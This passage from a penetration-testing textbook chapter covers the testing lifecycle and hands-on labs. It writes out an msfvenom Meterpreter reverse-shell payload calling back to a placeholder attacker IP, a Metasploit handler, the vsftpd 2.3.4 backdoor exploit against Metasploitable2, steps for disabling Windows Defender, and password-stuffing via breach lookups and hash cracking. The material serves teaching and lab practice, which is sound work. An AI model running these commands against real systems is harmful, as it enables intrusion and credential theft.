>  After hitting Run Anyway, nothing appears to have happened on the Windows VM.  However, jumping back to Kali's Metasploit listener, I see that a connection was made.  The attacker now has remote control of this Windows victim through a Meterpreter reverse shell!
>  ![[../images/10/rev_activity_connection.png|Meterpreter Reverse Shell Connection|600]]
>  The terminal changes from msf6 to Meterpreter indicating a new command line.  Running the help menu displays all the Meterpreter commands available.  There are many interesting commands listed.
>  ![[../images/10/rev_activity_help.png|Meterpreter Help Menu|600]]
>  The session could terminate unexpectedly, requiring the listener to be restarted and for the victim to re-execute the `runme.exe` file.  To validate the connection, I run the system information command which gives me details about the victim's operating system.
>  ```
>  sysinfo
>  ```
>  ![[../images/10/rev_activity_sysinfo.png|Meterpreter Sysinfo Command Results|600]]
>  There are many other Meterpreter features worth exploring, some of which will be covered in a later activity.

One method to block outbound reverse shell connections within a network is to constrain egressed ports allowed within a network firewall.  Many secure networks will not have access to the internet or are only allowed to connect to DNS and HTTP services over ports 53 and 80/443, respectively.  While this will thwart any reverse shells trying to connect on any other port, many attackers will use DNS or HTTP ports to bypass these network limitations.  Therefore, advanced next-generation firewalls with port and protocol mismatch detection should be enforced that will monitor outbound connections over these allowed ports to validate that they adhere to the protocol.  If the firewall detects a non-HTTP compliant connection over port 80, it will alert or block that traffic.  In response, attackers may use HTTP reverse shells or C2 agents like those available in Covenant to make protocol and port matching reverse shell connections. 
## Testing Process
Attackers, penetration testers, and red teams follow a typical testing flow that can be organized in phases.  These phases, which are described further in this section, have a logical path of flow or execution order, but should be interpreted as a general guideline and are not strictly required.  After the engagement scope is documented, a test may start with **reconnaissance** work in which the tester identifies and learns about the target.  From there, the tester will perform **enumeration** on the targets to identify the specific points of entry available.  Upon discovery of an entry point, the tester will conduct an **exploitation** phase which is used to gain **initial access** to the target.  Once the target has been accessed, **post exploitation** efforts covered in the Persistence and Privilege Escalation chapter are performed.  The tester will document their activities and notable findings as they proceed, which will be consolidated and refined in a final document during the final **reporting** phase.
### Reconnaissance
A goal of reconnaissance (recon) is to discover information about the target prior to performing any attacks.  Any information could be valuable so there is no limit to what should be collected.  Usually, this information will surround the people and technologies used by the target.  Building a roster of the organization's employees, such as their title and names, provides the tester or attacker with information that can be used later to wage attacks.  Consider the value of such information when sending phishing emails, as they would be more potent if the email was crafted to masquerade as a direct supervisor of the targeted user.  Furthermore, constructing a technology profile used by the organization enables the tester to focus attacks that will save time and be more discrete during attacks. 
#### Passive Reconnaissance
The reconnaissance phase can be further divided into *passive* and *active* categories.  Passive reconnaissance are efforts by the tester that will use publicly available resources to identify a target anonymously.  Such efforts are accomplished by using third party resources that have already gathered information on a target which the tester can use without the target knowing.  For example, in the Website Discover section in the Web Application Attacks chapter, we leveraged Google to identify subdomains of a target domain.  This effort would be anonymous relative to the target since Google would not normally report the search activity to the target.  Another example of passive enumeration was demonstrated in the Network Services chapter's Zone File activity where we used dnsdumpster.com to passively identify DNS records.

There are many public sites that collect information on the target that can be used for passive recon.  Many employees of organizations will list their work experience in detail on their LinkedIn profiles.  Organizations often have their own LinkedIn profiles for marketing purposes.  LinkedIn correlates individual's current work experience to these organization LinkedIn profiles which effectively provides an opensource employee directory roster.  Still building on the power of LinkedIn for passive recon is that the platform is heavily used by organizations for job postings, which sometimes leaks the technologies used.  For example, a job posting may state that the organization is looking for a MySQL database administrator.  This is a strong indication to the tester that the backend used for the company's website would be MySQL.

![[../images/10/shodan.png|Shodan Search For Yahoo|600]]

Another fantastic passive recon resource is Shodan, who regularly scans the entire internet public IP range for services.  Imagine performing an NMAP port, service, and version scan on every IP address, then making all the data accessible via a search engine.  That is what Shodan's service offers.  In addition, Shodan users can enter keywords like a company name and Shodan will return all related IP addresses and services.  The following screenshot is taken from Shodan after searching the term yahoo.  It reveals thousands of IP addresses across the globe.  Each IP can be drilled down further to discover even more information on the target.
#### Active Reconnaissance
Active reconnaissance activity still seeks to acquire useful information on the target; however, it does so in a less conspicuous manner that the target might notice or later trace back the tester's activity.  An example of active reconnaissance is when the tester accesses a target's website.  Such efforts would cause events to be registered in the web server's logs which would contain the tester's IP address.  Regardless, a target's website may contain a lot of useful information to the tester, such as the organization's management or email addresses.  Finding a user's email address could reveal the syntax used to for usernames in the target's network domain.  Common username syntax includes combinations of initials, full names and punctuation.  Observing an actual email address may reveal the username syntax used by the organization's information systems.

One of my favorite active recon methods while accessing a target's website is using the free browser extension Wappalyzer.  As you navigate a website, Wappalyzer identifies web technologies used and lists them for quick reference.  The following screenshot from the Wappalyzer extension was taken while visiting yahoo.com.  It shows that Yahoo uses Google Analytics and JavaScript core-js version 3.30.2, among many other interesting web technologies.

![[../images/10/wappalyzer.png|Wappalyzer Results On Yahoo|350]]
### Enumeration
The next phase in the testing process is **enumeration** (enum) where the tester performs manual and automated scanning on identified targets.  During this phase, the tester is attempting to identify entry points or weaknesses on the target.  An enum technique covered in the Web Application Attacks chapter is web directory busting that will guess URI directories and files.  Another example also covered in the previous chapter, Network Security, uses the tool NMAP, which can identify a target's ports, services and service versions.  Take the following NMAP scan result snippet into consideration.

![[../images/10/nmap_vstfpd.png|NMAP Scan Snippet|600]]

The scan identifies that port 21 is open on the target 172.17.0.2.  Port 21 is running an FTP service and NMAP was able to detect that the software being used on the port is Vsftpd version 2.3.4.  NMAP is able to identify this because it has a detection rule designed to test for specific hallmarks of the service that uniquely identifies the service.  Some of these rules are as simple as establishing a connection to the open port and analyzing the welcome banner which might include the software and its version.

With service software and versions in hand, the tester can perform a vulnerability scan identifying any known vulnerabilities based on the versions of the identified software.  NMAP has a built-in vulnerability scanner, but it is not usually depended upon as it is limited in the volume of vulnerabilities it can detect.  The Security Systems chapter covered vulnerability scanning that the tester could also use during this phase.  However, there are other resources available to the tester without having to resort to full scan.  For example, after discovering the service and version, the tester can look up any known vulnerabilities and available exploits on exploit-db.com.  Continuing the scenario based on the NMAP scan above, where the Vsftpd service running version 2.3.4 was discovered, navigating to exploit-db.com and searching the service and version reveals published Backdoor Command Execution exploit.

![[../images/10/exploitdb_vsftpd.png|ExploitDB Search For Vsftpd 2.3.4|700]]

The attacker can then use this exploit in the next phase of the testing lifecycle.
### Exploitation/Initial Access
Using information collected during reconnaissance and enumeration phases, the tester conducts direct attacks against targets to achieve **initial access**.  This initial access offers the tester an entry point into the target network where they can eventually expand their testing or campaign onto additional targets in the network.  The attacks during this **exploitation** phase can vary, but I will cover a few of the most common vectors in this section.
#### Phishing Attacks
If you have an email account, you most certainly have come across a malicious email.  Such emails might be attempting to scam you for money or access, while others are designed to capture your system credentials or compromise your device.  A red team tester or malicious actor might use phishing techniques to obtain initial access to a target.  Common payloads used in exploits during phishing attacks include stealing credentials or getting the victim to download and run malware. 

To obtain a victim's credentials, the phisher will include a link in the phishing email enticing the user to follow it.  Once pressed, the victim is navigated to a phishing website that prompts them to enter their username, password, and sometimes MFA token.  If the victim does this, the information is sent to the phisher who can use it to gain access to the system.

The other attack path that can be used to gain initial access is the exploitation of malicious software.  In the previous section of this chapter, I demonstrated how to generate a Msfvenom payload executable that established a reverse shell to a Meterpreter listener in Metasploit.  Similarly, a binary that establishes attacker remote connectivity could be sent to the victim in a phishing email.
#### Password Stuffing Attacks
Everyone should realize by now that many commonly used web applications have been compromised, as there have been so many widely publicized cyber security incidents.  What you may not realize is that many of these data breaches included the service's user table from the compromised database.  This table typically includes the username and passwords which are often hashed and released onto the *darknet*.  These leaked databases of usernames or email addresses are available for anyone to download and search through.

Instead of downloading these databases from the seedy underworld, someone could simply navigate and search on a free online service such as breachdirectory.org.  Entering an old and now defunct email address of mine in this search engine shows the partial cleartext as well as the full hashed password stolen from one of these breaches!

![[../images/10/breach_directory.png|Breach Directory Search|350]]

The partial password and hash could be used to easily perform an offline dictionary attack and crack the password.  However, it might be a common enough password to already be in a rainbow table or otherwise precomputed.  There also exist online search engines where you enter a hash and the plaintext is returned from a pre-cracked database.  One of my favorites is crackstation.net where I enter the hash provided from Breach Directory and have the cracked password returned!

![[../images/10/crackstation.png|Crack Station Result|650]]

Do not worry, this password and email address of mine are no longer in use.  I learned long ago that using a dictionary word for a password was a bad idea and I have replaced all my passwords with long and high entropy values while ensuring I use a unique password for every system.  But most people have not learned this lesson and will use the same password or slightly modified password for every system, including systems they use for work.  Astute testers know this and will research people's personal emails, find leaked passwords, and use them to guess credentials for other systems known as a **password stuffing** attack.

>[!story] Story - Board Training
>In one of my previous roles, I was responsible for developing and executing Board of Directors security training.  This included designing and conducting a one-hour security related training session with the board during their regular board meetings.  I tried to change it up each year and make it intriguing to the directors while striking a balance of practicality and technical jargon.  I figured doing so would have the greatest benefit to their knowledge.
>
>One year, I decided to cover the password stuffing attacks from a practical perspective.  While I structured the training using a slide deck, I also demonstrated password stuffing live.  I chose the company's previous CEO as a target and navigated to their LinkedIn profile.  This individual revealed their personal email address within their profile's contact information, which is commonly done on that platform.  I took this email and headed over to Breach Directory which displayed several records with partial passwords to a variety of systems that were leaked.  With a hash in hand, I headed over to Crack Station and pulled the cracked password in plaintext.  From there, I rhetorically asked the board members if any of them use the same or similar password for multiple systems and if they also used them for work.  
>
>Later that afternoon, several hours after the training and the board meeting completed, half of the board members called me directly very concerned about their own password security.  I instructed each of them on the value of password hygiene and how to best protect themselves.  I would say the training was a success!
#### Password Spraying Attacks
Many password systems mitigate online password brute force attacks by putting a limit on the number of sequential incorrect password attempts before the account is locked.  This introduces a denial of service as an attacker could purposefully and continuously lock an account.  Therefore, a more sophisticated mitigation is to put a time delay between guesses that makes brute force efforts take too long for the attacker's patience.  In light of these mitigations, a **password spraying** technique was developed that attempts to log into several accounts using a common password.  This technique avoids causing accounts to be locked and is often successful if there are enough users to guess.  For example, somebody is probably using `Password123!` and by checking one user account at a time, the attacker is likely to find them.
#### Service Exploitation
Most services are reasonably secure and only allow for the functionality of the service without enabling remote access to the underlying system.  However, it is not uncommon for a service to have a vulnerability discovered that allows arbitrary code or command execution that leads to a complete system compromise.  This happens so often that regular patch management is a must for network exposed services.  Take the example of the Vsftpd service running version 2.3.4 in the scenario provided in the previous section where a remote code execution exploit was listed on ExploitDB.  This service is absolutely discoverable by a tester and would be exploited to gain initial access.  To avoid this type of exploitation, it is important for defenders and administrators to ensure a strong patch management process while limiting the attack surface of exposed systems.

>[!activity] Activity 10.4 - Metasploitable2
>So far in this chapter we have explored Metasploit, reverse shells, and the testing process.  These skills can be practiced on the vulnerable by design Metasploitable2 docker image.  This image has many services and a web application which has many vulnerabilities.  The goal of the system is to practice identifying and exploiting vulnerabilities and will make as a great proxy to perform a mock penetration test against.
>
>After launching the Kali VM and starting a terminal, I download and run the Metasploitable2 image in the background with the following command.  Adding "&" at the end of any command in Linux keeps the process running in the background while returning you to the command line.
>```bash
>docker run -it --name "metasploitable2" tleemcjr/metasploitable2 sh -c "bin/services.sh && bash" &
>```
>![[../images/10/pentest_activity_metasploitable.png|Running Metasploitable2 On Kali|600]]
>This action requires Docker to be installed, and my current user added to the Docker group.  Both prerequisites were accomplished during previous activities.  Here are the commands that were previously used for reference.
>```bash
>sudo apt update -y
>sudo apt install -y docker.io
>sudo usermod -aG docker $USER
>reboot
>```
>After a minute the Metasploitable container should be partially running, which I confirm by listing all running containers. 
>```bash
>docker container ls
>```
>![[../images/10/pentest_activity_container_list.png|Confirming Container Running|600]]
>>[!tip] Tip - Give Metasploitable2 Time
>>It can take 15 minutes for Metasploitable to get fully up and running.
>
>Now that the Metasploitable container appears to be running, I am ready to begin my enumeration efforts.  First, I need to discover the network Docker is running on within my Kali host.  Listing the interfaces on the machine shows a virtual interface called `docker0` that shows the Kali host's Docker network is on the 172.17.0.1/16 network.  This means that both the Kali VM and the Metasploitable container are part of the same virtual network.
>```bash
>ip a
>```
>![[../images/10/pentest_activity_interfaces.png|Kali Docker Network Check|600]]
>With the network identified, I use NMAP to perform a ping sweep and identify the Metasploitable target IP address.  After running the command, NMAP starts to blindly ping every IP address in the /16 network and finds 172.17.0.2 within a few minutes.
>```bash
>sudo nmap -sn 172.17.0.1/16
>```
>![[../images/10/pentest_activity_ping_sweep.png|Ping Sweep Docker Network To Find Target|600]]
>My next step is to enumerate the services and versions on the Metasploitable target at 172.17.0.2.  I run NMAP again specifying TCP and version scans against the target identified in the ping sweep.  I leave the default top 1000 ports to check but could perform a more thorough scan with the option `-p-`.  However, even the top 1000 ports check identifies many interesting services!
>```bash
>sudo nmap -sT -sV 172.17.0.2
>```
>![[../images/10/pentest_activity_services.png|NMAP Service Scan On Metasploitable|500]]
>There are many potential targets to further enumerate.  The first one that catches my eye is port 21 Vsftpd version 2.3.4.  You may recall that this software version was explored on ExploitDB and could contain a remote code execution Metasploit exploit.  I start Metasploit to begin my exploitation phase of the penetration test.
>```bash
>sudo msfdb run
>```
>![[../images/10/pentest_activity_metasploit_start.png|Starting Metasploit on Kali|500]]
>Once Metasploit starts, I search for useful modules related to Vsftpd.
>```bash
>search vsftpd
>```
>![[../images/10/pentest_activity_search.png|Searching Vsftpd Modules In Metasploit|500]]
>The second module looks promising as it has an excellent rank and suggests it is a remote command execution module for Vsftpd 2.3.4.  I select the module with the `use` command then display the options related to the it.
>```bash
>use exploit/unix/ftp/vstfpd_234_backdoor
>```
>![[../images/10/pentest_activity_use_exploit.png|Select Exploit and Display Configuration Options|500]]
>Looks like I need to set RHOSTS as it is required.  I could change the payload, but the default one should work well.  I set RHOSTS to the target IP 172.17.0.2 and then run the exploit.
>```
>set RHOSTS 172.17.0.2
>run
>```
>![[../images/10/pentest_activity_exploit.png|Running Exploit Against Target|500]]
>Almost immediately, I receive positive log messages and then about 30 seconds later, another output message suggests that command shell session 1 was opened.  Entering the sessions command reveals an active and open session related to the exploit.
>>[!tip] Tip - Return to MSF
>>If you are following along and MSF put you into the shell session automatically, you can return to Metasploit by running the `background` command.  This will put you back to the MSF command line where the `sessions` command can be run.
>```
>sessions
>```
>![[../images/10/pentest_activity_session.png|Listing Metasploit Sessions|500]]
>The session listed was generated from the exploit.  It represents a connection my Kali host has to the Metasploitable victim container.  I jump into the session's terminal using the session command, but this time specifying the session ID 1.
>```
>sessions 1
>```
>![[../images/10/pentest_activity_interactive_session.png|Entering Interactive Session 1|500]]
>The interactive session is started and I am left with a blank command line.  I try the following commands that return standard output from the victim!  I now have a remote terminal on the victim from the Vsftpd exploit.
>```bash
>whoami
>uname -a
>ip a
>```
>![[../images/10/pentest_activity_rce_terminal.png|Command Terminal On Victim|500]]
>I can hop out of the interactive session and return to Metasploit with the `background` command while answering yes.  Afterwards, I can access the session again using the session command.
>```
>background
>y
>```
>![[../images/10/pentest_activity_background.png|Background Interactive Session|500]]

### Post-Exploitation
The tactics performed after initial access are called post exploitation and consist of persistence, pillaging, privilege escalation, and pivoting.  Persistence and privilege escalation tools and techniques were covered in more detail within the Persistence and Privilege Escalation chapter.  After persistence is established by the tester, they will perform pillage efforts to gather inside information from the compromised device.  The tester will perform system specific information gathering to learn as much as they can about the now compromised system.  This information may include the software that is installed on it, uses of the system, the processes, services and jobs running on it, and any other devices it might be connected to within the network.  Further pillaging efforts seek to collect credentials from the system's trust stores, security systems, applications, and browsers.

>[!tip] Tip - Browser Credentials
>Modern browsers prompt users to remember credentials after they have been submitted to a website.  These credentials are stored within the browser's vault system, which is typically a database file.  Access to the browser under that user's account allows for unfettered access to their saved credentials in the plain text.  This is a rich source to pillage by an attacker!
>
>Personally, I never use the browser vaults in favor of a password manager (that is not integrated with the browser).  It is less convenient among other tradeoffs, which might make it less secure for typical users, but I feel that it is most secure for me!

Pivoting tactics, or *lateral movement*, essentially allow the tester to access other systems within the networks the compromised machine can reach.  A device could have multiple network interfaces that enable access to additional networks or could otherwise be accessible through router and firewall rules.  If another device has a remote management port, the tester could leverage any credentials already collected and attempt to access another device.  Upon accessing a new system, the attacker starts their post exploitation phase over again.  Another aspect of pivoting includes the establishment of tunnels and proxies to reach far away devices in networks the tester does not have direct access to from their workstations.  Proxychains over SOCKS5 proxy enables an attacker to run tools locally on their workstation through a tunnel as another compromised device to reach a third target in a fully separate network.  There are many other tools that allow for the nesting of network connections this way and the reader should understand that once an initial system is compromised, multiple networks could ultimately be reached.
### Reporting
Upon completion of testing, a report is drafted that includes pertinent security information discovered.  It is up to the organization and the author to determine what is acceptable in a testing report; however, it will commonly have a background, executive summary, and itemization of detailed findings sections.

The background of the report should include a disclaimer that discusses the limitations of the test effort.  It should signal to the reader that in no way were all potential security issues identified and absolve the tester from missing vulnerabilities.  The background section typically includes an overview of the scope related to the tests.  Scope information such as what was tested, by whom, the types of tools used, and the timeframe the testing commenced.  The background section could include further boilerplate information that describes the rating systems and descriptions as well as any other information regarding the tester and the objectives of the test.

The next section of a professional report will include an executive summary in one or two pages that summarizes the positive security elements, as well as the security issues discovered.  It is commonly written in a narrative format, avoiding too much technical jargon as the summary's primary audience is organization management and not technical leads.  Graphs and tables, such as statistics on the number and severity of findings, are very beneficial because they quickly communicate the results of the report to the audience.  Providing an overall summary of security risk, such as high, medium, low scale, lends a relative understanding of the security posture that was determined and can also be compared between tests to show improvement progress.

>[!tip] Tip - Color Is Awesome
>Use color coding, such as red=bad, yellow=concern, green=good, to convey severity in reports.  This will clue executives where their focus is needed quickly and draw attention to the most important areas of a report.

The most important section of the report is the itemization of detailed findings.  Here, the tester will describe in technical details each security issue, vulnerability, and misconfiguration discovered.  It is a technical section meant for administrators and developers to reference during the remediation phase of the testing cycle.  Each finding should be separate from other findings and rated with a severity that is well supported.  Ideally these findings have industry references to CVEs, CWEs, OWASP and MITRE ATT&CK framework, as applicable.  The findings must state the asset where the issue was discovered, details to reproduce including commands and screenshots, and provide information on how to remediate the issue.

I highly recommend navigating to Juliosarfort's GitHub repository public-pentesting-reports at https://github.com/juliocesarfort/public-pentesting-reports for exploring dozens of reports produced by various testing firms.  Within the repository, you will find sample reports that include the aforementioned sections along with other useful sections and formatting to use in your own reports.  Another awesome resource is TCM's Sample Pentest Report https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report.  It is a great template to build from if you have to write a report from scratch.
## Exercises

>[!exercise] Exercise 10.1 - SSH
>In this task, you will connect to the Ubuntu VM from the Kali VM over SSH.
>#### Step 1 - SSH Server Setup
>Start your Ubuntu VM using the Bridge Adapter network mode and launch a terminal.  Run socket statistics and observe that there are no TCP sockets including port 22.
>```bash
>ss -antp
>```
>Install Open SSH on the Ubuntu VM.
>```bash
>sudo apt install openssh-server -y
>```
>Start the SSH daemon using `systemctl`. Once started, verify that it is up and running also using `systemctl`.
>```bash
>sudo systemctl start ssh 
>systemctl status ssh
>```
>Use socket statistics to confirm that port 22 is listening.  Check the Ubuntu VM IP address that will be used to make an SSH connection from the Kali VM.
>```bash
>ip a
>```
>#### Step 2 - Establish SSH Connection
>Launch your Kali VM with Bridge Adapter network settings and start a terminal.  Establish an SSH connection with the Ubuntu VM using the SSH client pre-installed on Kali. Make sure to replace the USER value in the command below with your Ubuntu VM username and the IP with the IP address of your Ubuntu VM.  Because we are using `sudo` with a low privilege user, enter your Kali VM user password.  Type "yes" when prompted to add the Ubuntu VM IP to the known hosts.  Lastly, enter your Ubuntu VM user password when prompted.
>```bash
>sudo ssh USER@IP
>```
>After entering the Ubuntu VM password, you will be logged in and presented with the Welcome terminal message and a shell.  Run `whoami` and `uname` to evidence you can run commands as the Ubuntu user on the Ubuntu VM from the Kali VM.
>```bash
>whoami
>uname -a
>```

> [!exercise] Exercise 10.2 - Reverse Shell
> In this task, you will simulate a user's downloading and running of malware on the Windows VM which makes a reverse shell connection to Metasploit running on the Kali VM.
> #### Step 1 - Prepare Windows
> Launch the Windows VM in Bridge Adapter network mode and start the "Virus & threat protection" program.  With Windows Security running, select "Manage settings" under the "Virus & threat protection settings".  Turn Off the "Real-time protection", "Cloud-delivered protection", "Automatic sample submission", and "Tamper Protection" settings accepting any UAC prompts.
> #### Step 2 - Prepare Payload
> Launch your Kali VM with Bridge Adapter network setting and launch a terminal.  Check the IP address of the Kali VM.
> ```bash
> ip a
> ```
> Create an msfvenom executable file using the Kali VM's IP address as the LHOST and port 9001 as the LPORT. Use the Windows x64 staged TCP payload and output the file named `runme.exe`. Make sure to replace the KALI_IP with the IP address of your Kali VM in the command sample below.
> ```bash
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=9001 -f exe -o runme.exe
> ```
> #### Step 3 - Start a Web Server
> On the Kali VM, where the `runme.exe` file was created, start a Python webserver. Observe that the webserver is standing by waiting for connections.
> ```bash
> sudo python3 -m http.server 80
> ```
> #### Step 4 - Start Meterpreter Listener
> In a new terminal on the Kali VM, start Metasploit.
> ```bash
> sudo msfdb run
> ```
> Navigate to the exploit multi-handler module.
> ```
> use exploit/multi/handler
> ```
> Configure the handler with the Kali VM IP address as the LHOST and port 9001 as the LPORT. Make sure to use your Kali VM IP address in place of KALI_IP.
> ```
> set LHOST KALI_IP
> set LPORT 9001
> ```
> Set the payload of the handler to the Windows x64 staged Meterpreter TCP setting we used when generating the EXE using Msfvenom.  
> ```
> set payload windows/x64/meterpreter/reverse_tcp
> ```
> Double check the settings and confirm that the payload, LHOST, and LPORT are correct.
> ```
> options
> ```
> Start the listener. This will create a service waiting for a connection from the Meterpreter payload generated using Msfvenom.
> ```
> run
> ```
> #### Step 5 - Trigger the Attack
> The Kali VM has a Meterpreter listener on port 9001 and a webserver running on port 80. Return to the Windows VM and open a web browser. We will simulate a victim user downloading and running a malicious file from the internet. Navigate to the Kali VM's IP address and observe a listing of folders and files.
> 
> Find the "`runme.exe`" file in the directory listing for the Kali VM and press it to download. Edge will likely stop the download since it is an executable. Click on the popup message and select Keep from the options menu. Next, SmartScreen will complain that the file is not verified - select Show more and choose "Keep anyway". Finally, the executable downloads!
> 
> Open the Downloads folder and double-click the "`runme.exe`" file to launch it. SmartScreen blocks the file from running because it has the "mark of the web" value set. Select "More info" and then "Run anyway". Observe that after a few seconds the Windows VM behaves normally while the reverse shell runs in the background.
> #### 6 - Profit!
> Now that the "`runme.exe`" ran on the Windows VM, return to the Kali VM's terminal that has the Metasploit handler/listener running. Observe that a stage was sent to the victim and a Meterpreter session was opened!
> 
> The Meterpreter shell acts like a wrapper to the Windows command line. The Meterpreter shell has many features such as download/upload, screen/keyboard recording, and much more. Type the help command to list all available features.
> ```
> help
> ```
> Explore the victim's system information using the built-in tool `sysinfo`. Observe that the Windows system information is returned.
> ```
> sysinfo
> ```
> >[!warning] Warning - Session Death
> >If your session dies, rerun the handler and re-execute the runme.exe on the victim to reestablish a connection. 
>
> Using the help menu, identify a command that looks interesting and run it. Describe the command and if you were successful running it.

>[!exercise] Exercise 10.3 - Metasploitable2
>In this task, you will set up a local docker container running Metasploitable2 and perform a penetration test against it. This black box scope starts at the enumeration through exploitation phases - reconnaissance and post exploitation phases are not required.
>#### Step 1 - Setup Metasploitable2
>Launch your Kali VM using the NAT network mode and start a terminal. Update your system.  Install docker which will be used to run a Metasploitable2 container.
>```bash
>sudo apt update -y
>sudo apt install -y docker.io
>```
>Add your Kali VM user to the docker group to avoid having to run as root. Afterwards, reboot your Kali VM so the permission settings take effect.
>```bash
>sudo usermod -aG docker $USER
>```
>With your Kali VM rebooted, run the Metasploitable2 docker image as name "metasploitable2", which will cause it to download automatically and start the services. The "&" ampersand at the end of the command makes the command run in the background of the terminal. **Please allow about 15 minutes for the container to download, run, and start services.**
>```bash
>docker run -it --name "metasploitable2" tleemcjr/metasploitable2 sh -c "bin/services.sh && bash" &
>```
>Confirm that the Metasploitable2 container is running. Observe that the status is "Up".
>```bash
>docker container ls
>```
>#### Step 2 - Host Discovery
>The Metasploitable2 container is our target victim that is running off our Kali VM's virtual docker interface. Identify the docker virtual interface network using the `ip` command. Observe the docker0 interface with the network 172.17.0.1/16
>```bash
>ip a
>```
>Perform a ping sweep to discover all hosts running on the docker0 network. Make sure to replace the network CIDR range if yours is different. Within a few seconds the ping sweep discovers a host on 172.17.0.2 (yours may be different). Once the host is discovered, press `CTRL+C` to stop the scan. Otherwise, you will have to wait several minutes for the scan to complete this /16 network.
>```bash
>sudo nmap -sn 172.17.0.1/16
>```
>#### Step 3 - Service Discovery
>Perform a TCP port and service scan against the identified target. Make sure to replace the IP with the identified metasploitable2 container IP discovered in the previous sub-step. Allow a few minutes for the scan to complete.
>```bash
>sudo nmap -sT -sV IP
>```
>Observe the target has several services open and that NMAP discovered versions of some of the identified services.  At this point, NMAP should have discovered port 21 among many other ports open.  If not, Metasploitable2 may need more time to finish loading.
>#### Step 4 - Exploitation
>The NMAP service and version discovery yielded several results. One result of particular interest is port 21 FTP service using vsftpd on version 2.3.4. Start Metasploit on your Kali VM.
>```bash
>sudo msfdb run
>```
>With Metasploit running, search for vsftpd exploits. Observe that Metasploit has an exploit for VSFTPD version 2.3.4 that matches Metasploitable2's running version!
>```
>search vsftpd
>```
>Select the vsftpd_234_backdoor exploit in Metasploit.
>```
>use exploit/unix/ftp/vsftpd_234_backdoor
>```
>Explore the required configurations needed with the options command.
>```
>options
>```
>Configure the RHOSTS (remote) option with the IP address of the metasploitable2 container. Make sure to replace VICTIM_IP with the IP address of metasploitable2.
>```
>set RHOSTS VICTIM_IP
>```
>After RHOSTS is set, run the exploit.  If it fails, give it another try or two.
>```
>run
>```
>After the exploit runs, the cursor is on a blank line. Run OS commands to confirm that the reverse shell is working.
>```bash
>whoami
>uname -a
>ip a
>```
>If needed, run sessions and sessions # to identify and use a running session.
>```
>sessions
>sessions 1
>```
>If you are in the shell, and want to return to Metasploit, run the `background` command and "y".
>```
>background
>```

>[!exercise] Exercise 10.4 - Penetration Test
>In this task, you will build on your penetration test from the previous task.  You MUST find two additional vulnerabilities on the Metasploitable2 victim and attempt to exploit them.  Regardless of success, you must document the VSFTPD vulnerabilities AND the two vulnerabilities you identify in a penetration report.  You may use any general format for the report, but it MUST include a background, summary, and findings sections.  Each finding in the report MUST include a description, severity/impact, proof of concept/demonstration with screenshots, and remediation recommendations.  Consider referencing a sample from [https://github.com/juliocesarfort/public-pentesting-reports](https://github.com/juliocesarfort/public-pentesting-reports) to guide the format of your professional report.

[^1]: Missouri gov. calls journalist who found security flaw a “hacker,” threatens to sue - Ars Technica; Oct 14th, 2021; https://arstechnica.com/tech-policy/2021/10/missouri-gov-calls-journalist-who-found-security-flaw-a-hacker-threatens-to-sue/